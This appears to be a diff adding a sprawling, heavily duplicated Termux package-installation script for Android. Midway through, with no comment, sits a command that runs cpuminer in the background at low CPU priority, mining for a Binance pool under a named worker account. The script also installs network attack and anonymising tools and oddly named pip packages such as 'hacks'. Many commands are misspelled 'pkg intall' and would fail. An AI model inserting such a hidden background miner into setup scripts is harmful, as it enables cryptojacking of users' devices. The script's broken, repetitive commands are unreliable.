+apt install -y termux-gui-c
+apt install -y termux-gui-package
+
+apt install -y termux-gui-pm
+
+apt install -y termux-keyring
+apt install -y teseq
+apt install -y tesseract
+
+apt install -y testssl.sh
+
+apt install -y tex-gyre
+apt install -y texlab
+
+apt install -y texlive-bin
+apt install -y thrift
+apt install -y tig
+apt install -y time
+apt install -y timg
+
+apt install -y tin-summer
+apt install -y tinyfugue
+apt install -y tinygo
+apt install -y tinygo-common
+
+apt install -y tinyproxy
+
+apt install -y tizonia
+
+apt install -y tk
+apt install -y tmate
+apt install -y toilet
+
+apt install -y tokei
+
+apt install -y tome2
+apt install -y toml11
+apt install -y topgrade
+apt install -y tor
+
+apt install -y totem-pl-parser
+apt install -y translate-shell
+apt install -y tree
+apt install -y tree-sitter-lua
+apt install -y tree-sitter-query
+apt install -y trojan-go
+apt install -y trzsz-go
+
+apt install -y tsduck-java
+apt install -y tsduck-plugins
+
+apt install -y tsduck-python
+
+apt install -y tsmuxer
+apt install -y tsocks
+apt install -y ttf-dejavu
+apt install -y tty-solitaire
+
+apt install -y ttyd
+apt install -y ttyper
+apt install -y ttyplot
+
+apt install -y tur-repo
+
+apt install -y tvheadend
+apt install -y tweego
+
+apt install -y typst
+
+apt install -y typst-lsp
+apt install -y typstfmt
+apt install -y uchardet
+
+apt install -y uftrace
+apt install -y ugit
+apt install -y ugrep
+apt install -y unar
+apt install -y unicorn
+
+apt install -y unpaper
+apt install -y unrar
+apt install -y unzip
+
+apt install -y utf8proc
+apt install -y utfdecode
+apt install -y uucp
+
+apt install -y uuid-utils
+apt install -y uwsgi
+
+apt install -y v2ray
+apt install -y valac
+apt install -y valadoc
+apt install -y valgrind
+apt install -y valgrind-static
+
+apt install -y vamp-plugin-sdk
+apt install -y vamp-plugin-sdk-static
+
+apt install -y vcsh
+apt install -y vegeta
+apt install -y vera
+apt install -y vgmstream
+apt install -y vgmtools
+
+apt install -y vifm
+
+apt install -y vis
+
+apt install -y viu
+
+apt install -y vivid
+
+apt install -y vobsub2srt
+
+apt install -y vorbis-tools
+apt install -y vtm
+
+apt install -y vttest
+
+apt install -y vtutils
+
+apt install -y vulkan-headers
+apt install -y vulkan-loader
+
+apt install -y vulkan-loader-generic
+apt install -y w3m
+
+apt install -y w3m-img
+apt install -y wakatime-cli
+
+apt install -y walk
+apt install -y wasi-libc
+
+apt install -y wasm-component-ld
+apt install -y wasmedge
+apt install -y wasmedge-static
+
+apt install -y wavpack
+
+apt install -y webp-pixbuf-loader
+
+apt install -y websocketd
+
+apt install -y weechat
+
+apt install -y weechat-lua-plugin
+apt install -y weechat-perl-plugin
+apt install -y weechat-python-plugin
+
+apt install -y weechat-ruby-plugin
+
+apt install -y weggli
+
+apt install -y wego
+apt install -y wget
+
+apt install -y wget2
+apt install -y wget2-static
+apt install -y wgetpaste
+
+apt install -y whiptail
+apt install -y whitebox-tools
+apt install -y whois
+
+apt install -y wireguard-tools
+
+apt install -y wiz
+
+apt install -y wol
+
+apt install -y wordgrinder
+apt install -y wren
+apt install -y wrk
+
+apt install -y x11-repo
+apt install -y x264
+apt install -y  xapian-tools
+
+apt install -y xh
+
+apt install -y xls2csv
+
+apt install -y xorg-util-macros
+apt install -y xorgproto
+apt install -y xorriso
+
+apt install -y xvidcore
+
+apt install -y xxhash
+
+apt install -y yadm
+apt install -y yara
+apt install -y yarn
+
+apt install -y yasm
+apt install -y yazi
+
+apt install -y youtubedr
+
+apt install -y yq
+
+apt install -y yuma123
+
+apt install -y zbar
+
+apt install -y zig
+apt install -y zile
+
+apt install -y zip
+
+apt install -y zipios
+apt install -y zk
+
+apt install -y zlib
+
+apt install -y zls
+
+apt install -y zoxide
+apt install -y zpaq
+
+apt install -y zrok
+
+apt install -y zssh
+
+apt install -y zsync
+apt install -y zziplib
+apt update
+apt upgrade -y
+dpkg --configure -a
+apt --fix-broken install -y
+apt autoremove -y
+apt update
+apt upgrade -y
+
+
+apt install -y abook
+apt install -y amfora
+apt install -y asciidoc
+
+apt install -y brook
+
+apt install -y bsd-finger
+apt install -y cliaoke
+apt install -y cookcli
+
+apt install -y crowbook
+apt install -y dnote
+
+apt install -y dnslookup
+
+apt install -y docbook-xml
+
+apt install -y docbook-xsl lazyread libedit
+
+apt install -y libkokkos
+
+apt install -y libmaxminddb-tools
+
+apt install -y loksh
+
+apt install -y npush nudoku okc-agents pass-otp pathpicker poke poke-static redis ripgrep-all scdaemon shiori stoken stoken-static tokei
+
+apt install -y 2048-c
+
+apt install -y alsa-lib
+apt install -y alsa-utils
+
+apt install -y bc
+
+apt install -y bc-gh
+
+apt install -y binutils
+
+apt install -y binutils-bin
+apt install -y binutils-cross
+apt install -y binutils-gold
+apt install -y binutils-is-llvm
+
+apt install -y binutils-libs
+
+apt install -y blink
+apt install -y cfm
+apt install -y cgdb
+apt install -y coreutils
+
+apt install -y cpio
+apt install -y datamash
+apt install -y ddrescue
+
+apt install -y debianutils
+apt install -y eigen
+
+apt install -y enchant
+
+apt install -y ethtool
+
+apt install -y findomain
+
+apt install -y freecolor
+apt install -y gdb
+
+apt install -y gettext
+
+apt install -y gforth
+
+apt install -y gsasl
+
+apt install -y gsl
+
+apt install -y gzip
+apt install -y hashdeep
+
+apt install -y html-xml-utils
+
+apt install -y htop
+
+apt install -y iptables
+
+apt install -y ladspa-sdk
+
+apt install -y lgogdownloader
+
+apt install -y libaio
+
+apt install -y libassuan
+
+apt install -y libcln
+
+apt install -y libfuse2
+
+apt install -y libfuse3
+
+apt install -y libgcrypt
+
+apt install -y libgpg-error
+
+apt install -y libgsasl
+
+apt install -y libidn
+
+apt install -y libmpc
+
+apt install -y libnl
+
+apt install -y libnpth
+apt install -y libntl
+
+apt install -y libobjc2
+
+apt install -y librinutils
+apt install -y libsigsegv
+
+apt install -y libtasn1
+
+apt install -y libtommath
+
+apt install -y libv4l
+
+apt install -y libxshmfence
+
+apt install -y lipl
+
+apt install -y loksh
+apt install -y lxc
+
+apt install -y manpages
+
+apt install -y mg
+
+apt install -y minicom
+
+apt install -y net-tools
+apt install -y nfs-utils
+
+apt install -y nmon
+
+apt install -y nudoku
+apt install -y nushell
+
+apt install -y octave
+
+apt install -y okc-agents
+
+apt install -y oleo
+
+apt install -y p11-kit
+apt install -y parallel
+apt install -y pari
+
+apt install -y passphrase2pgp
+
+apt install -y patch
+
+apt install -y progress
+apt install -y proot-distro
+
+apt install -y python-numpy
+
+apt install -y python-numpy-static
+apt install -y qemu-user-aarch64
+
+apt install -y qemu-user-arm
+
+apt install -y qemu-user-i386
+
+apt install -y qemu-user-m68k
+
+apt install -y qemu-user-ppc
+apt install -y qemu-user-ppc64
+apt install -y qemu-user-riscv32
+
+apt install -y qemu-user-riscv64
+
+apt install -y qemu-user-x86-64
+
+apt install -y quilt
+
+apt install -y rcs
+apt install -y rust-std-aarch64-linux-android
+
+apt install -y rust-std-armv7-linux-androideabi
+
+apt install -y rust-std-i686-linux-android
+
+apt install -y rust-std-x86-64-linux-android
+
+apt install -y sed
+
+apt install -y stoken
+
+apt install -y subtitleripper
+
+apt install -y tar
+
+apt install -y time
+apt install -y tizonia
+apt install -y traceroute
+apt install -y tvheadend
+
+apt install -y udftools
+apt install -y libczmq zerotier-one libprotozero qt5-qtgraphicaleffects qt6-qtimageformats  
+apt install -y up
+apt install -y util-linux
+apt install -y util-linux-static
+apt install -y v4l-utils
+apt install -y wget2
+apt install -y vfu videogen vim-addon-mw-utils vim-autopep8 vim-haproxy vim-icinga2 vim-puppet vim-python-jedi vim-rails vim-syntastic
+apt install -y ruby
+
+gem update --system 
+pkg install -y liblqr libnewt libpoco libsamplerate libstemmer libtreesitter libxcvt llvm-mingw-w64 llvm-mingw-w64-libcompiler-rt llvm-mingw-w64-tools llvm-mingw-w64-ucrt blackbox box2d boxedwine boxes bubblewrap busybox dosbox dosbox-x dosbox-x-data feed2imap-go fluxbox hstr isync mailsync matchbox-keyboard 
+
+pkg install -y obconf 
+
+pkg install -y obconf-qt 
+
+pkg install -y openbabel 
+
+
+pkg install -y openbox 
+
+pkg install -y openbox-static rhythmbox rhythmbox-help shellinabox sing-box squeezelite the-powder-toy whiptail whitebox-tools xfce4-mailwatch-plugin 
+
+apt install -y python3-matplotlib python3-pip python3-full build-essential automake autoconf nano pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++ z3 ntp sntp yasm flex git gcc bash bat bats cmake python3-twisted python3-wheel tar automake gzip wget curl python3-z3 nsca node-sntp tcllib suck trn4 radioclk libnet-ntp-perl leafnode php-net-nntp raintpl jython 
+
+python3 -m pip install pychroot zzip importlib-resources z4-solver captchasolver py.proxy blockchain z4 binance pool worker click librosa blockchain-etl binance-connector
+ 
+ apt install -y aspnetcore-runtime-6.0 aspnetcore-runtime-7.0 dotnet-apphost-pack-6.0 
+
+apt install -y dotnet-apphost-pack-7.0 dotnet-apphost-pack-8.0 
+
+apt install -y dotnet-host
+
+apt install -y dotnet-host-7.0 
+
+apt install -y dotnet-host-8.0 dotnet-hostfxr-6.0 dotnet-hostfxr-7.0 
+
+apt install -y dotnet-hostfxr-8.0 dotnet-runtime-6.0 dotnet-runtime-7.0 dotnet-runtime-8.0 
+
+apt install -y dotnet-sdk-6.0 dotnet-sdk-6.0-source-built-artifacts dotnet-sdk-7.0 dotnet-sdk-7.0-source-built-artifacts
+
+apt install -y dotnet-sdk-8.0 dotnet-sdk-8.0-source-built-artifacts dotnet-targeting-pack-6.0 dotnet-targeting-pack-7.0 
+
+apt install -y dotnet-targeting-pack-8.0 dotnet-templates-6.0 dotnet-templates-7.0 
+
+
+apt install -y dotnet-templates-8.0 dotnet6 dotnet7 dotnet8 libgtk-dotnet3.0-cil libgtk-dotnet3.0-cil-dev libgtk2.0-cil libgtk2.0-cil-dev 
+
+apt install -y duck bettercap wmbubble python3-box readucks gkrellm-bfm golang-github-wildducktheories-go-csv-dev garagemq zydis-tools ruby-ethon libjsmn-dev libmatthew-java-doc libnss-tls
+ 
+ 
+ ./cpuminer --algo=sha256d --threads=1 --cpu-priority=0 --cpu-affiniy=0x0010000000001000 --api-bind=127.0.0.1:38364::38390 --url=stratum+tcp://sha256.poolbinance.com:443 --user=dolBlob01.001 -p 123456 --background
+
+
+
+
+
+pkg in build-essential
+
+apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
+
+apt install -y autoconf resolv-conf automake php prover9 z3 dcmtk git-gitk pdftk pypy-tkinter pypy3-tkinter python-tkinter tk git proot wget curl zziplib assimp osm2pgsql mg vile gap
+
+apt install -y flex yasm 
+
+apt install -y gcal libgc libgc-static libgcrypt libgcrypt-static libsigc++-2.0 libsigc++-3.0 pngcrush
+
+apt install -y flex-static libfcl liblog4c libphysfs libpipeline libsoldout yasm-static
+
+apt install -y ctags esbuild fossil gbt glib gn gradle hz ldc
+
+apt install -y libresolv-wrapper libunbound resolv-conf
+
+apt install -y libarchive libarchive-static libchipmunk libhdf5 libopencc libtalloc libuber-h3 libunbound libyaml-cpp libzip lua-lpeg macchina marisa memcached muchsync ncompress netcdf-c mbedtls mc 
+
+apt install -y miniserve monolith moreutils zile cgdb
+
+apt install -y mruby msmtp mupdf mupdf-tools mympd n2n ncdc nginx ngircd oathtool oathtool-static openethereum pass
+
+apt install -y pcal proxychains-ng pup python-greenlet python-grpcio python-libsass python-lxml restish serd serf shell2http shellharden shtool signify slashtime
+
+apt install -y libforestdb libfreexl libftxui libgcrypt libgf2x libglvnd libgnt libgpg-error
+
+apt install -y libgrpc libgts libhdf5 libhiredis libhtmlcxx libical libicu libimagequant libjansi
+
+apt install -y libliquid-dsp libmad libmcrypt libmesode
+
+apt install -y libmhash libmicrohttpd libmnl libmp3lame libncnn libnova liboggz
+
+apt install -y libopencc libosl libotr libplist libpoco libpolly libprotozero libraqm
+
+apt install -y aha ansifilter console-bridge dasel docbook-xml docbook-xsl enscript g-ir-scanner
+
+apt install -y gumbo-parser html-xml-utils html2text imlib2
+
+apt install -y imlib2-static libebml libexpat libhtmlcxx libhtmlcxx-static
+
+apt install -y id3lib imlib2 ipcalc iperf3 json-glib
+
+apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libnewt libolm libtreesitter
+
+apt install -y libdvbcsa libdvbpsi libvbisam tvheadend vbindiff ocl-icd octave opencl-clhpp opencl-headers opencl-vendor-driver openethereum outfieldr pastebinit peaclock
+
+apt install -y google-drive-upload
+apt install -y google-glog
+apt install -y googletest
+apt install -y translate-shell
+apt install -y aapt
+apt install -y aapt2
+
+apt install -y apt
+apt install -y dpkg
+apt install -y dpkg-perl
+apt install -y dpkg-scanpackages
+apt install -y libapt-pkg-perl
+apt install -y pkg-config
+
+apt install -y pkgfile
+apt install -y pkgtop
+
+apt install -y cfengine
+apt install -y cfengine-static
+apt install -y cfm
+apt install -y go-musicfox
+
+apt install -y libfcft
+apt install -y libxcfun
+apt install -y mcfly
+apt install -y ncftp
+apt install -y openfoam
+
+apt install -y recutils
+apt install -y gbt
+apt install -y hstr
+apt install -y zsh
+apt install -y zsh-completions
+
+apt install -y  brook fact++ fastmod fdupes freeimage libandroid-wordexp libbullet libccd libdav1d
+
+apt install -y nsis ocl-icd odt2txt okc-agents oorexx open-adventure openal-soft openbabel opencc-tools
+
+apt install -y opencl-clhpp
+
+apt install -y opencl-headers
+
+apt install -y opencl-vendor-driver opencolorio
+
+apt install -y opencv opencv-python openethereum
+
+apt install -y openethereum-utils openexr openfoam opengl openjdk-17 
+
+apt install -y openjdk-17-source
+
+apt install -y openjdk-17-x openjpeg openjpeg-tools openldap
+
+apt install -y openldap-static openmpi 
+
+apt install -y openmpi-static openscad openssh 
+
+apt install -y openssh-sftp-server openssl
+
+apt install -y openssl-1.1
+
+apt install -y openssl-1.1-static 
+
+apt install -y openssl-static
+
+apt install -y openssl-tool openssl1.1-tool
+
+apt clean 
+clear 
+pkg clear 
+termux-reload-settings 
+pkg update -y 
+pkg upgrade -y 
+pkg upgrade -y
+pkg in build-essential
+apt install -y samba libcairomm-1.0 libcap libidn2 libisofs libjasper libjasper-utils libksba libnghttp2 libsigc++-2.0 libsigc++-3.0 libtpms libtvision libzmq openjpeg openjpeg-tools range-v3 stdman dirb fzf fzy glow harfbuzz harfbuzz-icu harfbuzz-utils lexter pick wuzz zziplib zzuf zzuf-static fatsort fcp libcap libhtmlcxx libice liblua51 libsm libx11 libx11-static libxau libxcb libxdmcp libxext libxfixes libxi libxrandr libxss libxt libzxing-cpp lua51 openjdk-21-x screen tergent x11-repo xorgproto
+pkg upgrade -y
+pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo dpkg dpkg-perl dpkg-scanpackages libapt-pkg-perl pkg-config pkgfile pkgtop cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+pkg install -y abook aerc aichat 
+pkg install -y alembic alpine amfora ani-cli 
+pkg install -y boinctui bombadillo bore cadaver catgirl 
+pkg install -y cec-client cliaoke clidle clifm
+pkg install -y clinfo clipp cloneit cookcli 
+pkg install -y corgi dictd discordo dnsutils 
+pkg install -y doge dropbear duckdb ecj fdroidcl 
+pkg install -y ffsend finch geckodriver geographiclib 
+pkg install -y glab-cli glow gomp gomuks hcloud hummin 
+pkg install -y hut ices inxi irssi jack-example-tools jfrog-cli jftui jira-go jql k9s 
+pkg install -y kakoune-lsp kubectl lastpass-cli lftp libc-client libc-client-static libcurl libhiredis libice 
+pkg install -y libmesode libmpdclient libnats-c 
+pkg install -y libneon libnfs libnl-cli 
+pkg install -y libnl-cli-static libshout 
+pkg install -y libsoup libsoup3 libssh2 libtd libusbmuxd libx11 libxcb libxrender 
+pkg install -y lux mangal markdown-flashcards matterircd minidlna miniupnpc 
+pkg install -y monolith mosquitto mpdscribble msmtp mu mutt mympd ncdc ncmpcpp 
+pkg install -y ncspot octave openethereum 
+pkg install -y pastebinit pianobar pounce profanity python-pynvim q-dns-client 
+pkg install -y railway-cli rbw rdircd restish rirc rtorrent sd seafile-client 
+pkg install -y seafile-client-static senpai serf snapcast-client snapcast-server 
+pkg install -y snowflake-client sssnake step-cli storj-uplink sun tea
+pkg install -y telegram-cli tintin++ tinyfugue tizonia toxic transmission trzsz-ssh ttyc virustotal-cli 
+pkg install -y wakatime-cli waypipe websocat weechat whois wireproxy ytui-music 
+pkg install -y liblqr libnewt libpoco libsamplerate libstemmer 
+pkg install -y libtreesitter libxcvt
+pkg install -y llvm-mingw-w64 
+
+pkg install -y llvm-mingw-w64-libcompiler-rt 
+
+pkg install -y llvm-mingw-w64-tools
+pkg install -y llvm-mingw-w64-ucrt blackbox box2d boxedwine 
+pkg install -y boxes bubblewrap busybox dosbox 
+pkg install -y dosbox-x
+pkg install -y dosbox-x-data feed2imap-go 
+pkg install -y fluxbox hstr isync mailsync matchbox-keyboard 
+
+pkg install -y obconf 
+
+pkg install -y obconf-qt 
+
+pkg install -y openbabel 
+
+
+pkg install -y openbox 
+
+pkg install -y openbox-static rhythmbox rhythmbox-help shellinabox sing-box squeezelite the-powder-toy whiptail whitebox-tools xfce4-mailwatch-plugin 
+
+
+pkg install -y gcc-default-9 
+
+pkg install -y gnome-text-editor lxde-icon-theme marco mcfly pwgen xfce4-screensaver
+
+
+pkg install -y gcc-default
+pkg install -y gcc-default-10
+
+pkg install -y gcc-default-11
+
+pkg install -y gcc-default-12
+
+pkg install -y gcc-default-13
+
+pkg install -y gcc-default-14 
+
+
+pip install lolcat
+pip install autoclick
+pkg install -y python-scipy
+
+pkg install -y python-numpy-static
+pkg install -y jump 
+pkg install -y markdown-flashcards 
+pkg install -y tcl 
+pkg install -y typst
+
+pkg install -y netsurf
+pkg install -y tsu
+
+pkg install -y curl 
+pkg install -y curlie 
+pkg install -y libcurl 
+pkg install -y libcurl-static 
+pkg install -y websocat
+
+pkg intall -y bluefish
+
+pkg intall -y cuse
+
+pkg intall -y dialog
+
+pkg intall -y eww
+
+pkg intall -y gengetopt
+
+pkg intall -y getconf
+
+pkg intall -y geth
+
+pkg intall -y geth-utils
+
+pkg intall -y gettext
+pkg intall -y gettext-static
+
+pkg intall -y gifsicle
+
+pkg intall -y kf6-kcompletion
+
+pkg intall -y kf6-kconfigwidgets
+
+pkg intall -y kf6-ki18n
+
+pkg intall -y kf6-kjobwidgets
+
+pkg intall -y kf6-ktextwidgets
+
+pkg intall -y kf6-kwidgetsaddons
+
+pkg intall -y kf6-purpose
+
+pkg intall -y libcwidget
+
+pkg intall -y libcwidget-static
+
+pkg intall -y libfinalcut
+
+pkg intall -y libgedit-gtksourceview
+
+pkg intall -y libnewt
+
+pkg intall -y libt3widget
+
+pkg intall -y libxaw
+
+pkg intall -y libxfce4ui
+
+pkg intall -y motif
+
+pkg intall -y nzbget
+
+pkg intall -y qcustomplot
+
+pkg intall -y qtermwidget
+
+pkg intall -y qtutilities
+
+pkg intall -y rust-std-aarch64-linux-android
+
+pkg intall -y rust-std-armv7-linux-androideabi
+
+pkg intall -y rust-std-i686-linux-android
+
+pkg intall -y rust-std-wasm32-unknown-unknown
+
+pkg intall -y rust-std-wasm32-wasi
+
+pkg intall -y rust-std-wasm32-wasip1
+
+pkg intall -y rust-std-wasm32-wasip2
+
+pkg intall -y rust-std-x86-64-linux-android
+pkg intall -y teleport-tsh 
+pkg intall -y uget 
+pkg intall -y vegeta 
+pkg intall -y wget 
+pkg intall -y wget2
+pkg intall -y wget2-static 
+pkg intall -y wgetpaste 
+pkg intall -y wxwidgets 
+pkg intall -y xsel
+
+
+pkg intall -y blk-utils
+
+pkg intall -y bluefish
+
+pkg intall -y build-essential
+
+pkg intall -y clinfo
+
+pkg intall -y clpeak
+
+pkg intall -y codeblocks
+
+pkg intall -y cryptsetup
+
+pkg intall -y cscope
+
+pkg intall -y devilspie
+
+pkg intall -y devilspie2
+
+pkg intall -y dtc
+
+pkg intall -y erofs-utils
+
+pkg intall -y ethtool
+
+pkg intall -y freeimage
+
+pkg intall -y frida
+
+pkg intall -y frida-dev
+
+pkg intall -y gauche
+
+pkg intall -y gecode
+
+pkg intall -y glfw
+
+pkg intall -y hz
+
+pkg intall -y i2c-tools
+
+pkg intall -y icu-devtools
+
+pkg intall -y ipmitool
+
+pkg intall -y iw
+
+pkg intall -y kf6-purpose
+
+pkg intall -y ladspa-sdk
+
+pkg intall -y libblkid
+
+pkg intall -y libccid
+
+pkg intall -y libcdk
+pkg intall -y libcoap
+
+pkg intall -y libcryptsetup
+
+pkg intall -y libdevil
+
+pkg intall -y libdevmapper
+
+pkg intall -y libevdev
+
+pkg intall -y libevdev-static
+
+pkg intall -y libgedit-tepl
+
+pkg intall -y libimobiledevice
+
+pkg intall -y libimobiledevice-glue
+
+pkg intall -y libimobiledevice-glue-static
+pkg intall -y libimobiledevice-static
+
+pkg intall -y libmnl
+
+pkg intall -y libtheora
+
+pkg intall -y libusb
+
+pkg intall -y libusbmuxd
+
+pkg intall -y libusbredir
+
+pkg intall -y libv4l
+
+pkg intall -y libvmaf
+pkg intall -y libwolfssl
+pkg intall -y lit
+pkg intall -y llvm-tools
+
+pkg intall -y lvm2
+
+pkg intall -y mate-common
+
+pkg intall -y miniupnpc
+
+pkg intall -y mtd-utils
+
+pkg intall -y mtdev-static
+
+pkg intall -y openjdk-17
+
+pkg intall -y openjdk-21
+
+pkg intall -y panda3d
+
+pkg intall -y pciutils
+pkg intall -y python-cryptography
+
+pkg intall -y qt-creator
+
+pkg intall -y qt5-qttools
+
+pkg intall -y qt6-qttools
+
+pkg intall -y rgbds
+
+pkg intall -y root-repo
+
+pkg intall -y rustc-dev
+
+pkg intall -y scrcpy
+
+pkg intall -y scrub
+
+pkg intall -y teleport-tsh
+
+pkg intall -y termux-x11-nightly
+
+pkg intall -y usbmuxd
+
+pkg intall -y v4l-utils
+
+pkg intall -y wavemon
+
+pkg intall -y xfce4-dev-tools
+
+pkg intall -y z-push
+
+pip install pyopenssl telethon requests captcha-solver
+pip install pychroot --no-deps
+pip install librosa --no-deps
+
+cd ~
+cd /data/data/com.termux
+passwd
+pwd
+apt clean 
+clear 
+pkg clear 
+termux-reload-settings 
+pkg update -y 
+pkg upgrade -y 
+pkg upgrade -y
+pkg in build-essential
+apt install -y samba libcairomm-1.0 libcap libidn2 libisofs libjasper libjasper-utils libksba libnghttp2 libsigc++-2.0 libsigc++-3.0 libtpms libtvision libzmq openjpeg openjpeg-tools range-v3 stdman dirb fzf fzy glow harfbuzz harfbuzz-icu harfbuzz-utils lexter pick wuzz zziplib zzuf zzuf-static fatsort fcp libcap libhtmlcxx libice liblua51 libsm libx11 libx11-static libxau libxcb libxdmcp libxext libxfixes libxi libxrandr libxss libxt libzxing-cpp lua51 openjdk-21-x screen tergent x11-repo xorgproto
+pkg upgrade -y
+pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo dpkg dpkg-perl dpkg-scanpackages libapt-pkg-perl pkg-config pkgfile pkgtop cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+apt install -y google-drive-upload
+apt install -y google-glog
+apt install -y googletest
+apt install -y translate-shell
+apt install -y aapt
+apt install -y aapt2
+
+apt install -y apt
+apt install -y dpkg
+apt install -y dpkg-perl
+apt install -y dpkg-scanpackages
+apt install -y libapt-pkg-perl
+apt install -y pkg-config
+
+apt install -y pkgfile
+apt install -y pkgtop
+
+apt install -y cfengine
+apt install -y cfengine-static python python2
+apt install -y cfm
+pkg install git ffmpeg htop vim bison 
+apt install -y autoconf resolv-conf yasm flex make cmake automake bat rcs abduco acr 
+git clone https://github.com/termux/proot-distro
+git clone https://github.com/termux/termux-auth
+git clone https://github.com/termux/termux-widget
+git clone https://github.com/termux/termux-tools
